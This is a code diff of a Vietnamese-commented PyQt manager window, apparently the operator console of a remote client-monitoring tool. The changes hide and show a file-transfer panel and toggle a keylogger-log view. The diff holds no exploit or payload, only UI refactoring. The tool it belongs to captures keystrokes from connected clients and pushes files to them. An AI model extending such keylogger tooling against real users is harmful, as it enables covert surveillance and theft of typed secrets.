@@ -639,12 +639,22 @@ class ManageClientsWindow(QWidget):
         """Show error message"""
         self.action_area.append(f"Error: {error_msg}")
     
+    def _hide_file_transfer_panel(self):
+        """Ẩn file transfer panel nếu đang hiển thị"""
+        if hasattr(self, 'file_transfer_panel') and self.file_transfer_panel:
+            self.file_transfer_panel.hide()
+        # Hiển thị lại action_area
+        self.action_area.show()
+    
     def view_keylogger(self):
         """Bật hiển thị keylogger logs - hiển thị khi client đã bắt đầu dịch vụ"""
         if not self.selected_client_id:
             self.action_area.clear()
             self.action_area.append("⚠️ Vui lòng chọn client trước!")
             return
+        
+        # Ẩn file transfer panel nếu đang hiện
+        self._hide_file_transfer_panel()
         
         # Bật keylogger mode
         self.keylogger_active = True
@@ -698,6 +708,9 @@ class ManageClientsWindow(QWidget):
         if not self.selected_client_id:
             self.action_area.append("⚠️ Vui lòng chọn client trước!")
             return
+        
+        # Ẩn file transfer panel nếu đang hiện
+        self._hide_file_transfer_panel()
         
         self.action_area.clear()
         alert_icon = "\U0001F6A8"  # Emoji 🚨
@@ -886,15 +899,18 @@ class ManageClientsWindow(QWidget):
             self.action_area.append("⚠️ Vui lòng chọn client trước!")
             return
         
+        # Tắt keylogger mode khi chuyển sang file transfer
+        self.keylogger_active = False
+        
         # Import file transfer panel
         from src.manager.gui.file_transfer_panel import ManagerFileTransferPanel
         
-        # Clear action area và thêm file transfer panel
+        # Clear action area và ẩn nó
         self.action_area.clear()
         self.action_area.hide()
         
         # Tạo file transfer panel nếu chưa có
-        if not hasattr(self, 'file_transfer_panel'):
+        if not hasattr(self, 'file_transfer_panel') or self.file_transfer_panel is None:
             self.file_transfer_panel = ManagerFileTransferPanel(self)
             
             # Connect signals
@@ -908,21 +924,17 @@ class ManageClientsWindow(QWidget):
                 manager.file_send_complete.connect(lambda filename: 
                     self.file_transfer_panel.status_label.setText(f"✅ Đã gửi: {filename}"))
                 manager.file_send_error.connect(self.file_transfer_panel.show_error)
+            
+            # Add panel to layout (chỉ làm 1 lần)
+            right_panel = self.action_area.parent()
+            if right_panel:
+                layout = right_panel.layout()
+                if layout:
+                    layout.addWidget(self.file_transfer_panel, stretch=1)
         
         # Set selected client
         self.file_transfer_panel.set_client(self.selected_client_id)
-        
-        # Add panel to layout
-        # Find the right_layout and add the panel
-        right_panel = self.action_area.parent()
-        if right_panel:
-            layout = right_panel.layout()
-            if layout:
-                # Remove action_area từ layout nếu có
-                layout.removeWidget(self.action_area)
-                # Add file transfer panel
-                layout.addWidget(self.file_transfer_panel, stretch=1)
-                self.file_transfer_panel.show()
+        self.file_transfer_panel.show()
         
         print(f"[ManageClientsWindow] 📁 Hiển thị file transfer cho client: {self.selected_client_id}")
     
